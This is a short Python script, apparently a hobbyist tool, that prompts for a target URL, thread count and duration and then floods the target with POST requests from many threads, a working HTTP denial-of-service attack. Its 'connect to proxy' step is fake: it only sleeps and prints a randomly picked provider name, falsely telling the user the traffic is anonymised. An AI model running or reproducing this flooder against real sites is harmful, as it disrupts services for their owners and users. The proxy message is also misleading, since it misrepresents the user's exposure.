import threading
import os
import random
import requests
import time
from pystyle import Colors, Colorate, Center


COLOR_CODE = {
    "RESET": "\033[0m",
    "GREEN": "\033[32m",
    "RED": "\033[31m",
}


def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')


COLOR_CODE = {
    "GREEN": "\033[0;32m",
    "RESET": "\033[0m",
}
os.system("cls")
print(Colorate.Horizontal(Colors.green_to_white, "Made by: Lemonaidd"))
print(f'''{COLOR_CODE["GREEN"]} 

 ███▄ ▄███▓▓██   ██▓    ███▄    █ ▓█████▄▄▄█████▓
▓██▒▀█▀ ██▒ ▒██  ██▒    ██ ▀█   █ ▓█   ▀▓  ██▒ ▓▒
▓██    ▓██░  ▒██ ██░   ▓██  ▀█ ██▒▒███  ▒ ▓██░ ▒░
▒██    ▒██   ░ ▐██▓░   ▓██▒  ▐▌██▒▒▓█  ▄░ ▓██▓ ░ 
▒██▒   ░██▒  ░ ██▒▓░   ▒██░   ▓██░░▒████▒ ▒██▒ ░ 
░ ▒░   ░  ░   ██▒▒▒    ░ ▒░   ▒ ▒ ░░ ▒░ ░ ▒ ░░   
░  ░      ░ ▓██ ░▒░    ░ ░░   ░ ▒░ ░ ░  ░   ░    
░      ░    ▒ ▒ ░░        ░   ░ ░    ░    ░      
       ░    ░ ░                 ░    ░  ░        
            ░ ░                                  ''')  



def connect_to_proxy():
    print(Colorate.Horizontal(Colors.green_to_white, "Connecting to proxy..."))
    time.sleep(2)
    proxy_provider = random.choice(["Zyte", "Oxylabs", "Fineproxies", " IPRoyal", "WebShare","SOAX","PCMag","Proxyway","Netnut","Oculus Proxies","ayobyte","Smartproxies","toolip"])
    print(f"{COLOR_CODE['GREEN']}Connected to {proxy_provider} !")
              
def ddos_attack():
    link = input(Colorate.Horizontal(Colors.green_to_white, "Target URL: "))
    num_threads = int(input(Colorate.Horizontal(Colors.green_to_white, "Threads: ")))
    attack_duration = int(input(Colorate.Horizontal(Colors.green_to_white, "Attack duration (in seconds): ")))

    def send_request(session):
        while time.time() < end_time:
            try:
                session.post(link)
                print(f"{COLOR_CODE['GREEN']} POST Request sent to: {link}{COLOR_CODE['RESET']}")
            except requests.RequestException:
                print(f"{COLOR_CODE['RED']}ERROR ERROR ERROR {link}{COLOR_CODE['RESET']}")
    
    end_time = time.time() + attack_duration
    threads = []
    session = requests.Session()
    connect_to_proxy()
    
    for _ in range(num_threads):
        thread = threading.Thread(target=send_request, args=(session,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    
     
    print(Colorate.Horizontal(Colors.green_to_white, "\nAttack Stopped"))

if __name__ == "__main__":
    ddos_attack()
